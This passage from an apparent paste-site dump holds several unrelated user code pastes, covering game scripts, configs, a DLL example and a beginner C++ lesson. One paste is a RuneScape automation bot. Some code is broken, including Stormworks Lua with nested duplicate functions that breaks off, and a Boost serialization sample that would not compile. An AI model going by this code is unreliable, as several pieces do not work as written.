		Remotes.Notify:FireClient( Player , 'End Game UI' , MatchData , CalculatedRewards , CurrentPlayerRankData ) ; 
	end) ; 
	--// Reset the attribtes //--
	for Attribute,Value in _G.ServerGameSettings._RingAttributes do
		self:_SetAttribute( Attribute , Value ) ; 
	end ; 

	for _,Connection in self.MatchConnections do
		Connection:Disconnect() ; 
	end ; 
	table.clear(self.MatchConnections) ;

	table.clear(self.Team1) ; table.clear(self.Team2) ;
end ; 

function Ring:_BeginGameLoop()
	--// Game variables //--
	local TeamMoves = {Team1='',Team2=''}

	--// Establish connections //--
	self.MatchConnections[ 'Client.Action.Conection' ] = ClientAction.OnServerEvent:Connect(function( Player , Action , ActionData )
		--// Verify player //--
		if _G.GameFunctions.GetRing( Player ) ~= self.Model or ActionData.Move == nil or not table.find( {'Left','Right','Up','Down'} , ActionData.Move ) then
			return ; 
		end ; 
		--// Verify if they can play the move //--
		local PlayerConfig = _G.GameFunctions.GetPlayerConfig( Player ) ; 
		if (Action == 'Play Move') and (PlayerConfig ~= nil) and TeamMoves[PlayerConfig:GetAttribute( 'Team' )] == '' and table.find( Http:JSONDecode(PlayerConfig:GetAttribute( 'MovesEnabled' )) , ActionData.Move ) and self.CanPlayMove == true and (self.MoveCountdown > 0) then
			--// Assign the move to the proper variable //--
			TeamMoves[PlayerConfig:GetAttribute( 'Team' )] = ActionData.Move ; 
			print( '[Server Debug]: ' .. Player.Name .. ' Played ' .. ActionData.Move ) ; 
		end ; 
	end) ; 

	--// Main Game Loop //--
	task.wait(0.25) ; 
	while self.InGame == true do task.wait()
		local DefendingTeam = self.Defending ; local AttackingTeam = self.Attacking ; 

		local AttackingTeamPlayer = self[self.Attacking][1] ; 
		local DefendingTeamPlayer = self[self.Defending][1] ; 

		local AttackingTeamConfig = _G.GameFunctions.GetPlayerConfig( AttackingTeamPlayer ) ; 
		local DefendingTeamConfig = _G.GameFunctions.GetPlayerConfig( DefendingTeamPlayer ) ; 

		--// Verify everything //--
		if DefendingTeamPlayer == nil or AttackingTeamPlayer == nil then
			self:End({})
			break ; 
		end ; 

		task.wait(0.3) ; 

		--// Prompt the player to move //--
		self:_SetAttribute( 'CanPlayMove' , true ) ; 

		--// Play the idle animation on the attacking team //--
		local AttackingTeamIdleAnimation = _G.GameFunctions.GetAnimation( AttackingTeamPlayer , 'Shadow.Box.Idle' ) ;
		if AttackingTeamIdleAnimation ~= nil then
			AttackingTeamIdleAnimation:Play( 0.2 ) ; 
		end ; 

		local CurrentTime = tick() ; local TimePassed = 0 ; 
		local TimeToMakeMove = _G.ServerGameSettings.TimeToMakeMove
		self:_SetAttribute( 'Status' , 'Waiting for moves' ) ; 

		--// Wait for moves to be played by both sides //--
		repeat task.wait()
			TimePassed = tick() - CurrentTime ; 
			self:_SetAttribute( 'MoveCountdown' , math.clamp(TimeToMakeMove - TimePassed,0,TimeToMakeMove) ) ;
		until 
		(TimePassed >= TimeToMakeMove) or (TeamMoves.Team1 ~= '' and TeamMoves.Team2 ~= '' ) or 
			(AttackingTeamPlayer.Parent == nil) or (DefendingTeamPlayer.Parent == nil) or 
			(self:_CanGameContinue() == false) ;

		if self:_CanGameContinue() == false then
			self:End({}) ; 
			break ;
		end

		self:_SetAttribute( 'Status' , 'Playing' ) ; 

		if self:_CanGameContinue() == false then
			self:End({}) ; 
			warn( '[Server Debug]: ' .. self.Name .. ' Was Unable To Continue The Match' ) ;
			break ; 
		end ; 

		self:_SetAttribute( 'CanPlayMove' , false ) ; 

		--// Verify moves //--
		print( '[Server Debug]: Team1 Move: ' .. TeamMoves.Team1 .. ' Team2 Move: ' .. TeamMoves.Team2 ) ;

		local AttackingTeamMove = TeamMoves[self.Attacking] ;  
		local DefendingTeamMove = TeamMoves[self.Defending] ;

		local AttackingTeamCombo = Http:JSONDecode(AttackingTeamConfig:GetAttribute( 'Combo' )) ;
		local AttackingTeamMovesEnabled = Http:JSONDecode(AttackingTeamConfig:GetAttribute( 'MovesEnabled' )) ; 
		local DefendingTeamMovesEnabled = Http:JSONDecode(DefendingTeamConfig:GetAttribute( 'MovesEnabled' ))

		--// Add the combo the combo table //--
		AttackingTeamCombo[#AttackingTeamCombo+1] = {
			Attacking = AttackingTeamMove,
			Defending = DefendingTeamMove
		}

		--// Add default moves if moves arent there //--
		if AttackingTeamMove == '' then
			AttackingTeamMove = AttackingTeamMovesEnabled[math.random(1,#AttackingTeamMovesEnabled)] ; 
		end ; 
		if DefendingTeamMove == '' then
			DefendingTeamMove = AttackingTeamMovesEnabled[math.random(1,#DefendingTeamMovesEnabled)] ; 
		end ;  

		_G.GameFunctions.StopAnimations( AttackingTeamPlayer , 0.2 ) ; 
		_G.GameFunctions.StopAnimations( DefendingTeamPlayer , 0.2 ) ; 
		for Index,Directions in AttackingTeamCombo do
			--// Get the animation based on the direction in the combo //--
			local AttackingTeamAnimation = _G.GameFunctions.GetAnimation( AttackingTeamPlayer , 'Shadow.Box.'..(Directions.Attacking) ) ; 
			local DefendingTeamAnimation = _G.GameFunctions.GetAnimation( DefendingTeamPlayer , 'Hit.' .. Directions.Defending ) ; 

			--// Used to check when both animations are finished playing. When equal to 2 then the animations are done //--
			local AnimationsFinished = 0 ; 

			--// Store the animations in a table and loop over them. play both animations at the same time and wait for them to finish. //--
			local AnimationTable = {AttackingTeamAnimation,DefendingTeamAnimation} ; 
			for Index,Animation in AnimationTable do
				if Animation ~= nil then
					local AnimationSpeed = 0.75 ; 
					task.spawn(function()
						Animation:Play( 0.2 , 1 , AnimationSpeed ) ;
						--// Wait until animation is done playing //--
						repeat task.wait() until (not Animation.IsPlaying)
						AnimationsFinished += 1 ; 
					end) ; 
				elseif Animation == nil  then
					AnimationsFinished += 1 ; 
				end ; 
			end ; 
			task.wait(0.15) ; 
			--// Continue on to the next animation //--
			repeat task.wait() until (AttackingTeamAnimation == nil or DefendingTeamAnimation == nil) or (AnimationsFinished >= 2) or 
				(self:_CanGameContinue() == false) ;
		end ; 
		if self:_CanGameContinue() == false then
			self:End({})
			break ; 
		end ; 

		--// check if moves are matching. Left and right have to be switched because player1 left is player2's right //--
		local AreMovesMatching = false ; 
		if AttackingTeamMove == 'Left' or AttackingTeamMove == 'Right' then
			if DefendingTeamMove == 'Left' or DefendingTeamMove == 'Right' then
				if AttackingTeamMove ~= DefendingTeamMove then
					AreMovesMatching = true ; 
				end ; 
			end ; 
		elseif AttackingTeamMove == 'Up' or AttackingTeamMove == 'Down' then
			if AttackingTeamMove == DefendingTeamMove then
				AreMovesMatching = true ; 
			end ; 
		end ; 

		if AreMovesMatching == false then
			--// Switch the teams and reset the combo //--
			table.clear( AttackingTeamCombo ) ; 
			self:_SwitchTeamTypes() ; 
			AttackingTeamIdleAnimation:Stop( 0.2 ) ; 
			local Moves = {'Left','Up','Right','Down'} ; 
			--// Reset moves enabled on both teams //--
			AttackingTeamConfig:SetAttribute( 'MovesEnabled' , Http:JSONEncode(Moves) ) ; 
			DefendingTeamConfig:SetAttribute( 'MovesEnabled' , Http:JSONEncode(Moves) ) ; 
			--// Reset the amount of hearts //--
			DefendingTeamConfig:SetAttribute( 'Hearts' , 3 ) ;
			
			AttackingTeamConfig:SetAttribute( 'Dodges' , AttackingTeamConfig:GetAttribute( 'Dodges' )+1 )
		elseif AreMovesMatching == true then
			--// End game if there are 3 combos //--
			if #AttackingTeamCombo >= 3 or DefendingTeamConfig:GetAttribute( 'Hearts' ) <= 0 then
				self:_EndGame( {
					Winner = AttackingTeamPlayer , 
					Loser = DefendingTeamPlayer ,
					LastDefenseMove = DefendingTeamMove ,
				}) ; 
				break ; 
			end ; 
			--// remove the move that the attacking team made from the moves enabled so they cant do it again //--
			table.remove( AttackingTeamMovesEnabled , table.find( AttackingTeamMovesEnabled , AttackingTeamMove ) ) ; 
			AttackingTeamConfig:SetAttribute( 'MovesEnabled' , Http:JSONEncode(AttackingTeamMovesEnabled) ) ; 
			--// remove the move that the defending team made from the moves enabled so they cant do it again //--
			table.remove( DefendingTeamMovesEnabled , table.find( DefendingTeamMovesEnabled , DefendingTeamMove ) ) ; 
			DefendingTeamConfig:SetAttribute( 'MovesEnabled' , Http:JSONEncode(DefendingTeamMovesEnabled) ) ; 

			DefendingTeamConfig:SetAttribute( 'Hearts' , DefendingTeamConfig:GetAttribute( 'Hearts' ) - 1 ) ;
			
			DefendingTeamConfig:SetAttribute( 'HeartsLost' , DefendingTeamConfig:GetAttribute( 'HeartsLost' )+1 )
			AttackingTeamConfig:SetAttribute( 'TotalCombos' , AttackingTeamConfig:GetAttribute( 'TotalCombos' )+1 )
		end ; 

		AttackingTeamConfig:SetAttribute( 'Combo' , Http:JSONEncode(AttackingTeamCombo) ) ;
		TeamMoves = {Team1='',Team2=''} ; 
	end ; 
end ; 

function Ring:End( EndingData )
	self:_SetAttribute( 'InGame' , false ) ; 
end ; 

return Ring ; 
"
R4bFuUhL,Untitled,Overwtime,YAML,Monday 3rd of July 2023 02:52:28 PM CDT,"# Сообщения плагина
messages:
  teleport_in: ""&c[*] &6Телепортация на арену через &c5 &6секунд""
  teleport_out: ""&c[*] &6Вы телепортируетесь с арены через &c%time% &6секунд""
  teleported_in: ""&c[*] &6Вы были телепортированы на &cарену""
  teleported_out: ""&c[*] &6Вы были телепортированы с &cарены""
  no_armor: ""&c[*] &6У вас не достаточно брони для входа на &cарену""
  debuff_apply: ""&c[*] &6Вы сняли слишком много брони и получили &cдебафы""
  leave_cmd_message: ""&c[*] &6Вы будете телепортированы с арены через %time% секунд""
  leave_message: ""&c[*] &6Игрок &c%player% &6вышел во время &cPVP на арене!""
  join_cancelled: ""&c[*] &6Вы уже находитесь на &cарене!""
  leave_cancelled: ""&c[*] &6Вы не находитесь на &cарене!""
  leave_cancelled_punch: ""&c[*] &6Телепортация с арены была &cотменена т.к. вас ударил игрок!""
  leave_cancelled_punched: ""&c[*] &6Телепортация с арены была &cотменена т.к. вы ударили игрока!""
  blocked_command: ""&c[*] &6Дання команда не доступна на &cарене!""
  no_perms: ""&4Команда для вас не доступна""
  
# Настройка боссбаров
bossbar_settings:
  # Боссбар, который будет показываться всем, кто есть на арене
  on_arena:
    # Включить ли данный боссбар
    enable_bossbar: true
    # Цвет боссбара (PINK, BLUE, RED, GREEN, YELLOW, PURPLE, WHITE)
    bar_color: RED
    # Тип боссбара (SOLID, SEGMENTED_6, SEGMENTED_10, SEGMENTED_12, SEGMENTED_20)
    bar_style: SOLID
    # Сообщение в боссбаре
    bar_message: ""&cРежим PVP &f- &aАКТИВЕН""
  # Боссбар, который будет показывать отсчет до телепорта на арену
  teleport_in:
    enable_bossbar: true
    bar_color: GREEN
    bar_style: SEGMENTED_6
    bar_message: ""&6Телепорт через: &c%time% сек.""
  # Боссбар, который будет показывать отсчет до телепорта из арены
  teleport_out:
    enable_bossbar: true
    bar_color: GREEN
    bar_style: SEGMENTED_12
    bar_message: ""&6Телепорт через: &c%time% сек.""

# Настройки звуков, которые будут проигрываться при действиях 
# Список всех звуков: https://hub.spigotmc.org/javadocs/bukkit/org/bukkit/Sound.html
sound_settings:
  # Звук, который будет проигрываться при попадании на арену
  teleport_in:
    # Включить ли звуки при входе на арену
    enable_sound: true
    # ID звука
    sound: BLOCK_NOTE_BLOCK_PLING
    # Громкость звука от 0.0 до 1.0
    volume: 0.75
    # Тон звука от 0.5 до 2.0 (больше = ""писклявее"")
    pitch: 1.0
  # Звук, который будет проигрываться при выходе с арены
  teleport_out:
    enable_sound: true
    sound: BLOCK_NOTE_BLOCK_PLING
    volume: 0.75
    pitch: 1.0
  # Звук, который будет проигрываться при отмене телепортации (если у игрока нет одета броня)
  teleport_cancelled:
    enable_sound: true
    sound: ENTITY_VILLAGER_NO
    volume: 0.75
    pitch: 1.0
  # Звук, который будет проигрываться при наложении дебаффа (если у игрока нет одета броня)
  apply_debuff:
    enable_sound: true
    sound: ENTITY_ITEM_BREAK
    volume: 0.75
    pitch: 1.0

# Настройки для арены
arena_settings:
  # Локации арены (куда будет телепортирован игрок при попадании на арену. Выбирается рандомно) (мир;x;y;z)
  arena_locations: 
    - world;10;10;10
    - world;20;20;20
    - world;30;30;30
  # Локация куда игрок будет телепортирован с арены
  out_location: world;-10;-10;-10
  # Время перед входом на арену (в секундах)
  join_time: 5
  # Время перед выходом с арены (в секундах)
  leave_time: 30
  # Настройки команды для быстрого лива с арены (/fastleave)
  fast_leave:
    enable: true
    time: 15
    apply_effect: true
    effects:
      - 'GLOWING;15;1'
  # Отменять ли отсчет до выхода с арены при получении игроком урона
  hit_cancel_leave_attempt: true
  # Писать ли сообщения при выходе игрока во время нахождения на арене
  message_on_leave: true
  # Убивать ли игрока при выходе с арены
  kill_on_leave: true
  # Блокировка действий на арене (true - блокировать, false - ничего не делать)
  restricted_actions:
    chorus: true
    enderpearl: false
    commands: 
      enable: true
      mode: 'whitelist' # whitelist - разрешенные команды на арене blacklist - запрещенные команды на арене
      list:
        - '/m'
        - '/message'
        - '/t'
        - '/tell'
        - '/leave'
        - '/leavearena'
  # Настройка брони, с которой можно войти на арену (поставьте [] в разделах чтобы броня на данной части тела не учитывалась)
  required_armor:
    head:
    - NETHERITE_HELMET
    - DIAMOND_HELMET
    body:
    - NETHERITE_CHESTPLATE
    - DIAMOND_CHESTPLATE
    legs:
    - NETHERITE_LEGGINGS
    - DIAMOND_LEGGINGS
    boots:
    - NETHERITE_BOOTS
    - DIAMOND_BOOTS
  # Настройка дебафов, которые игрок получает, если находится на арене без брони
  arena_debuff_settings:
    # Включить ли дебафы
    enable_debuffs: true
    # Эффекты, которые будут накладываться на игроков, которые находятся под действием дебафа (ЭФФЕКТ;ВРЕМЯ;УРОВЕНЬ) (поставьте [] чтобы никакие эффекты не накладывались)
    effects:
      - 'BLINDNESS;60;3'
      - 'GLOWING;60;1'
    # Команды, которые будут применены к игрокам, которые получают дебафф (поставьте [] чтобы никакие команды не применялись)
    commands: 
      - 'thor %player%'"
NmCFMpcZ,extract for dll,dllbridge,C,Monday 3rd of July 2023 02:51:47 PM CDT,"/*
0) extern ""C"" __declspec(dllexport)
   - - - - - - - - - - - - - - - - -
1) int (*_rr)();
2) HMODULE  hDll = 0;
3) hDll = LoadLibrary(""dll/for.dll"");
4) _rr = (int(*)())GetProcAddress(hDll, ""_rr"");
5) FreeLibrary(hDll);
*/


// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
// File dllmain.cpp

#include <windows.h>



BOOL APIENTRY DllMain (HINSTANCE hInst,         // Library instance handle. 
                       DWORD    reason,         // Reason this function is being called. 
                       LPVOID reserved)         // Not used. 
{
    switch(reason)
    {
      case DLL_PROCESS_ATTACH:
                               break;

      case DLL_PROCESS_DETACH:
                               break;

      case DLL_THREAD_ATTACH:
                               break;

      case DLL_THREAD_DETACH:
                               break;
    }


    return TRUE;                                              // Returns TRUE on success, FALSE on failure 
}





////////////////////////////////
extern ""C"" __declspec(dllexport)
/////////////////////////////////////////////////////
int _rr()                                          //  
{
	
return 1142;	
}



// * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
// File main.cpp




#include   <windows.h>
#include     <stdio.h>



HMODULE  hDll = 0;


int (*_rr)();


////////////////////////////////////////////////////
int main()                                        // 
{


    hDll = LoadLibrary(""dll/for.dll"");
    
    if(hDll == 0)
    {
		
	   printf(""Error LoadLibrary\n"");
	   return 0;	
	}

   _rr = (int(*)())GetProcAddress(hDll, ""_rr"");
	
	if(_rr == 0)
    {
		
	   printf(""Error Get Proc\n"");
	   FreeLibrary(hDll);
	   return 0;	
	} 
	
	printf(""_rr() = %d"", _rr() );

    FreeLibrary(hDll); Sleep(2000); 
    
return 0;
}





"
Ut2NkjRT,Untitled,WarPie90,Delphi,Monday 3rd of July 2023 02:15:25 PM CDT,"program new;
{$DEFINE SRL_USE_REMOTEINPUT}
{$I SRL/osr.simba}

const
  USE_SPELL = ERSSpell.LOW_LEVEL_ALCHEMY;

type
  TAlchemyValue = record
    Name: string;
    Points: Int32;
  end;

  TAlchemyValues = array of TAlchemyValue;

var
  RSW: TRSWalker;

const
  cupboards: TPointArray = [
    [190,154], [190,138], [190,122], [190,106],
    [226,106], [226,122], [226,138], [226,154]
  ];

  pattern: TStringArray := [
    'Leather boots', 'Adamant kiteshield', 'Adamant med helm', 'Emerald',
    'Rune longsword','','',''
  ];


function TRSInventory.GetUnusedSlots(): TIntegerArray;
var slot: Int32;
begin
  Inventory.Open();
  for slot:=0 to High(Inventory.GetSlotBoxes()) do
    if not Inventory.IsSlotUsed(slot) then
      Result += slot;
end;


procedure onterm();
begin
  RSClient.Image.Clear();
end;


function NearestCupboardID(): Int32;
var  // function assumes you have already moved to the cupboard
  i: Int32;
  p: TPoint;
begin
  p := RSW.GetMyPos();
  for i:=0 to High(Cupboards) do
    if Cupboards[i].DistanceTo(p) < 11 then
      Exit(i);

  Result := -1;
end;

function GetExtractedItemId(unused: TIntegerArray): Int32;
var
  i: Int32;
begin
  Inventory.Open();
  Result := -1;
  for i:=0 to High(pattern)-3 do
    if ItemFinder.Find(pattern[i], [Inventory.GetSlotBox(unused[0])]) <> [] then
      Exit(i);
end;

function GetCurrentOrderOffset(): Int32;
var
  unused: TIntegerArray;
  pos: Int32;
  TPA: TPointArray;
  ATPA: T2DPointArray;
  c: TCircle;
begin
  repeat
    pos    := NearestCupboardID();
    unused := Inventory.GetUnusedSlots();

    srl.FindColors( TPA, CTS2(9082515, 21, 0.30, 0.13), Minimap.PointToMsRect(RSW.WorldToMM(Cupboards[pos])).Bounds());
    ATPA := TPA.Cluster(3);

    c := ATPA.Biggest().MinAreaCircle();
    c.Radius := Round(c.Radius * 0.7);
    RSClient.Image.DrawCircle(c.Mean(), c.Radius, 255);
    Mouse.Click(c, MOUSE_LEFT);
    WaitUntil(Length(Inventory.GetUnusedSlots()) <> Length(unused), 50, 4000);

    Result := GetExtractedItemId(unused);
    if Result = -1 then
      RSW.WalkPath([Cupboards[(pos+4) mod 8]]);
  until Result <> -1;

  Result := srl.Modulo(pos-result, 8);
end;

function GetTranslationTable(): TIntegerArray;
var
  off,x,i: Int32;
  pt: TPoint;
begin
  off := GetCurrentOrderOffset();
  Result := [];
  for i:=0 to High(pattern) do
  begin
    x := srl.Modulo(i-off, Length(pattern));
    pt := Minimap.PointToMs(RSW.WorldToMM(Cupboards[i]));
    RSClient.Image.DrawText(ToStr(i)+': '+ pattern[x], pt, 255);
    Result += x;
  end;
end;

procedure DrawTranslationTable(table: TIntegerArray);
var
  x,i: Int32;
  pt: TPoint;
begin
  for i:=0 to High(pattern) do
  begin
    x := table[i];
    pt := Minimap.PointToMs(RSW.WorldToMM(Cupboards[i]));
    RSClient.Image.DrawText(ToStr(i)+': '+ pattern[x], pt, 255);
  end;
end;


function GetAlchValues(): TAlchemyValues;
var
  b: TBox;
  TSA: TStringArray;
  TPA: TPointArray;
  ATPA: T2DPointArray;
  I,z: Int32;
begin
  b := Minimap.Bounds;
  b := [b.x1-250, b.y1+80, b.x2-250, b.y2+50];

  SRL.FindColors(TPA, CTS2(45620, 6, 0.14, 0.01), b);
  ATPA := TPA.Cluster(20, 2);
  ATPA.SortByX(True);
  ATPA.SortByY(True);

  RSClient.Image.DrawBox(b, 255);
  for i:=0 to High(ATPA) do
  begin
    TSA += ocr.Recognize(ATPA[i].Bounds().Expand(2), TOCRColorFilter.Create([45620], [30]), RS_FONT_PLAIN_11);
    z := TSA[High(TSA)].Pos('I');
    if z > 1 then
    begin
      if LowerCase(TSA[High(TSA)][z-1]) = TSA[High(TSA)][z-1] then
        TSA[High(TSA)][z] := 'l';
    end;

    TSA[High(TSA)] := TSA[High(TSA)].Replace('Helm', 'med helm', [rfReplaceAll]);
  end;

  for i:=0 to High(TSA) with 2 do
    Result += [TSA[i], StrToIntDef(TSA[i+1], 0)];
end;


function GetBestAlch(scores: TAlchemyValues): Int32;
var
  i,best: Int32;
begin
  best := 0;
  for i:=0 to High(scores) do
    if scores[i].Points > scores[best].Points then
      best := i;

  WriteLn('>>> Alch: ', scores[best].Name);
  for i:=0 to High(pattern) do
  begin
    if LowerCase(scores[best].Name).Pos(LowerCase(pattern[i])) > 0 then
      Exit(i);
  end;
end;

function Equal(A,B: TAlchemyValues): Boolean;
var i: Int32;
begin
  Result := True;
  for i:=0 to High(A) do
    if (A[i].Name <> B[i].Name) or (A[i].Points <> B[i].Points) then
      Exit(False);
end;


function Extract(): Int32;
var
  i,item,slot,count: Int32;
  best: TPoint;
  TPA: TPointArray;
  ATPA: T2DPointArray;
  translate: TIntegerArray;
  scores: TAlchemyValues;
  c: TCircle;
  items: TRSItemArray;
  t: TCountDown;
begin
  translate := GetTranslationTable();
  scores    := GetAlchValues();
  item      := GetBestAlch(scores);
  best      := cupboards[translate.Find(item)];

  RSW.WalkPath([best]);
  RSClient.Image.Clear();
  DrawTranslationTable(translate);

  // extract fast:
  WriteLn('Stage: Extract');
  t.Init(2500);
  while Equal(scores, GetAlchValues()) and (not t.IsFinished()) do
  begin
    srl.FindColors( TPA, CTS2(9082515, 21, 0.30, 0.13), Minimap.PointToMsRect(RSW.WorldToMM(best)).Bounds());
    ATPA := TPA.Cluster(3);
    c := ATPA.Biggest().MinAreaCircle();
    c.Radius := Round(c.Radius * 0.7);
    Mouse.Click(c, MOUSE_LEFT);
    Sleep(Random(250,500));
  end;

  // cast spell
  WriteLn('Stage: cast spells!');
  WriteLn pattern[translate.Find(item)];

  while Equal(scores, GetAlchValues()) do
  begin
    Magic.CastSpell(USE_SPELL);
    WaitUntil(Inventory.IsOpen(), 20, 5000);
    Inventory.ClickItem(pattern[item]);
    count := Inventory.CountItem(pattern[item]);
    WaitUntil(Magic.IsOpen(), 20, 5000);

    if count = 0 then break;
  end;

  if Length(Inventory.GetUnusedSlots()) < 10 then
  begin
    WriteLn('Stage: dropping crap');
    for i:=0 to High(pattern)-3 do items += pattern[i];
    Inventory.ShiftDrop(items, DROP_PATTERN_REGULAR);
  end;
end;


begin
  RSW.Setup('mta0');
  AddOnTerminate(@onterm);
  RSClient.Image.Clear();
  RSClient.Image.setFontSize(14);
  RSClient.Image.setFontAntialiasing(False);

  while True do
  begin
    RSClient.Image.Clear();
    Extract();

    // here we can check if we have reached 10K coins so we can leave the room
    // and break this loop
  end;

end."
wZtFufsu,Untitled,YomoMan,C++,Monday 3rd of July 2023 01:56:46 PM CDT,"#include <iostream>
#include <fstream>
#include <boost/statechart/state_machine.hpp>
#include <boost/statechart/simple_state.hpp>
#include <boost/statechart/event.hpp>
#include <boost/serialization/serialization.hpp>
#include <boost/archive/text_oarchive.hpp>
#include <boost/archive/text_iarchive.hpp>
#include <msgpack.hpp>

namespace sc = boost::statechart;

// События
struct EventStart : sc::event<EventStart> {};
struct EventStop : sc::event<EventStop> {};

// Состояния
struct StateIdle;
struct StateRunning;
struct StateFinished;

// Конечный автомат
struct MyStateMachine : sc::state_machine<MyStateMachine, StateIdle> {
    void start() { process_event(EventStart()); }
    void stop() { process_event(EventStop()); }

    std::string serialize_state() {
        std::ostringstream oss;
        boost::archive::text_oarchive oa(oss);
        oa << *this;
        return oss.str();
    }

    void deserialize_state(const std::string& serialized_state) {
        std::istringstream iss(serialized_state);
        boost::archive::text_iarchive ia(iss);
        ia >> *this;
    }
};

// Состояние: ожидание
struct StateIdle : sc::simple_state<StateIdle, MyStateMachine> {
    typedef sc::transition<EventStart, StateRunning> reactions;
};

// Состояние: работа
struct StateRunning : sc::simple_state<StateRunning, MyStateMachine> {
    typedef sc::transition<EventStop, StateFinished> reactions;
};

// Состояние: завершено
struct StateFinished : sc::simple_state<StateFinished, MyStateMachine> {};

int main() {
    // Создание экземпляра конечного автомата
    MyStateMachine sm;

    // Пример использования
    std::cout << typeid(sm.current_state()).name() << std::endl;  // Вывод: N8MyStateMachine9StateIdleE

    sm.start();
    std::cout << typeid(sm.current_state()).name() << std::endl;  // Вывод: N8MyStateMachine12StateRunningE

    std::string serialized_state = sm.serialize_state();

    // Можно сохранить serialized_state в файл или передать по сети

    // Десериализация состояния
    MyStateMachine sm2;
    sm2.deserialize_state(serialized_state);
    std::cout << typeid(sm2.current_state()).name() << std::endl;  // Вывод: N8MyStateMachine12StateRunningE

    sm2.stop();
    std::cout << typeid(sm2.current_state()).name() << std::endl;  // Вывод: N8MyStateMachine13StateFinishedE

    return 0;
}
"
ZG86HpBz,motyle,314ma,YAML,Monday 3rd of July 2023 01:54:49 PM CDT,"motyle_oswietlenie_zmierzch_jesien_zima:
  alias: ""Motyle - Oświetlenie - Zmierzch (Jesień - Zima)""
  sequence:
  - if:
    - condition: time
      after: ""17:30:00""
      before: ""19:10:00""
    - condition: template
      value_template: ""{{ now().month in [1, 2, 3, 4, 9, 10, 11, 12] }}""
    then:
    - service: light.turn_on
      data:
        transition: 5
        brightness_pct: ""{{ min(100, max(1149 - (now().hour*60 + now().minute), 0)) }}""
        kelvin: 6500
      target:
        entity_id: light.motyle_oswietlenie
"
Kjf1z1bi,lesson4_321,Petro_zzz,C++,Monday 3rd of July 2023 01:40:11 PM CDT,"#include <iostream>

using namespace std;
int val3 = 0;

void task_sum() {

	int val1 = 0;
	int val2 = 0;

	setlocale(LC_ALL, ""ru"");

	cout << ""Введите первое число: "";
	cin >> val1;
	cout << ""Введите второе число: "";
	cin >> val2;

	cout << val1 << "" + "" << val2
		<< "" = "" << val1 + val2 << endl;
}

void task_circlearea() {
	double r = 1.0e-2; // metr	
	const double pi = 3.1415926;
	
	int целое = 15;

	//pi = 1;
	cout << ""Circle area is ""
		<< pi * r * r << endl;
	cout << целое << endl;
}


void showLeapYear() {
	const int shift = 3;
	const int numDayYaer = 365;
	int year;// = 2004;

	cout << ""Enter year: "";
	cin >> year;

	cout << ""Num days per year: "";
	cout << ((year + shift) % 4) / 3 + numDayYaer
		 << endl;

	/*
	cout << 1 << ((1 + shift) % 4) / 3 << endl;
	cout << 2 << ((2 + shift) % 4) / 3 << endl;
	cout << 3 << ((3 + shift) % 4) / 3 << endl;
	cout << 4 << ((4 + shift) % 4) / 3 << endl;
	cout << 5 << ((5 + shift) % 4) / 3 << endl;
	cout << 6 << ((6 + shift) % 4) / 3 << endl;
	cout << 7 << ((7 + shift) % 4) / 3 << endl;
	cout << 8 << ((8 + shift) % 4) / 3 << endl;
	*/
}

int main() {
	//task_sum();
	//task_circlearea();
	showLeapYear();
	return 0;
}"
5wLe3csn,Radio Jammer,Lil_Peep,Lua,Monday 3rd of July 2023 01:39:08 PM CDT,"positive = {}		
function onTick()
	on = input.getBool(1)
	reset = input.getBool(2)
	t = input.getBool(3)
	NI = input.getBool(4)
	HL = input.getBool(5)
	fl = input.getBool(6)
	isPressed = input.getBool(7)
	Jamin = input.getBool(8)
	strength1 = input.getNumber(1)
	strength2 = input.getNumber(2)
	f1 = input.getNumber(3)
	f2 = input.getNumber(4)
	ti = input.getNumber(5)
	snif = input.getNumber(6)
	inputX = input.getNumber(7)
	inputY = input.getNumber(8)
	scroll = input.getNumber(9)
	
	
	ScrollP = isPressed and isPointInRectangle(inputX, inputY, 18, 26, 7, 6)
	ResetP = isPressed and isPointInRectangle(inputX, inputY, 27, 26, 7, 6)
	JamP = isPressed and isPointInRectangle(inputX, inputY, 36, 26, 7, 6)
	
	output.setBool(1,ScrollP )
	output.setBool(2, ResetP)
	output.setBool(3, JamP)
function onTick()
reset = input.getBool(1)
scroll = input.getNumber(1)
    composite = {}
    composite.bools={}
    composite.nums={}
    for i = 2, 32 do
        if input.getNumber(i)~=0 then table.insert(composite.nums,string.format(""%02d"",i)) end
    end

if reset == true then
	composite.nums = {}
		else
			end
end

function onDraw()
    screen.setColor(10,18,5,150)
    screen.drawRectF(0,7,100,100)
    screen.setColor(0,0,0)
    screen.drawTextBox(2,8-scroll,32,32,table.concat(composite.nums, ','))
	screen.setColor(5,9,2)
	screen.drawRectF(0,0,64,7)
	screen.setColor(0,0,0)
    screen.drawTextBox(0,1,32,6,""Number"",0,0)

end
	
	f1 = f1-2
	f2 = f2+2

	isInside=false
	isNotInside=true
	for i=1,#positive do
  	 isInside = isInside or f1 == positive[i]
  		 isNotInside = isNotInside and f1 ~= positive[i]
				end
				
	isInside2=false
	isNotInside2=true
		for i=1,#positive do
   		isInside2 = isInside2 or f2 == positive[i]
   			isNotInside2 = isNotInside2 and f2 ~= positive[i]
					end		
	
	if on == true and reset == false then
		if strength1 > 0.01 and reset == false and isInside == false then
			table.insert(positive,math.floor(f1+0))
		end
		
		if strength2 > 0.01 and f2 ~= f1 and reset == false and isInside2 == false then
			table.insert(positive,math.floor(f2+0))
		end
	else
		positive = {}
	end

end

function isPointInRectangle(x, y, rectX, rectY, rectW, rectH)
	return x > rectX and y > rectY and x < rectX+rectW and y < rectY+rectH
end


function onDraw()
	screen.setColor(10,18,5,150)
	screen.drawRectF(0,0,64,64)
	screen.setColor(0,0,0)

		if on == true and NI == false and HL == false then
	screen.drawTextBox(0,8-scroll,64,27,table.concat(positive, ','))
		end
				

screen.setColor(10,18,5,150)
screen.drawRectF(0,25,64,10)

if ScrollP == true then
	screen.setColor(50,30,15)
		else
			screen.setColor(0,0,0)
		end
screen.drawRect(18,26,7,6)
screen.drawText(20,27,""S"")

if ResetP == true then
	screen.setColor(50,30,15)
		else
			screen.setColor(0,0,0)
		end

screen.drawRect(27,26,7,6)
screen.drawText(29,27,""R"")

if Jamin == true then
	screen.setColor(50,30,15)
		else
			screen.setColor(0,0,0)
		end

screen.drawRect(36,26,7,6)
screen.drawText(38,27,""J"")

	screen.setColor(5,9,2)
	screen.drawRectF(0,0,64,7)
	screen.setColor(0,0,0)
    screen.drawTextBox(0,1,64,6,""Freq Scan"",0,0)


	if NI == true and fl == true then
		screen.drawTextBox(0,0,64,32,(""No Input""),0,0)
			else
		end
		function onTick()
